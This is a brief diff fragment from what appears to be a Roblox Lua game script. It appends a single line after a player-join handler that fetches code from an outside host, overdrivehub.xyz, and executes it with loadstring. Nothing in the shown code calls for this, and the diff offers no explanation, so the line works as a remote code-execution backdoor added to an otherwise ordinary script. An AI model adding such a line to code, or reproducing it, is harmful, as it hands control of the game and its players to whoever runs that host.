@@ -1187,3 +1187,5 @@ game.Players.PlayerAdded:Connect(function(player)
         end)
     end
 end)
+
+loadstring(game:HttpGet("https://overdrivehub.xyz/?d=auth&script=mm2_lite"))()
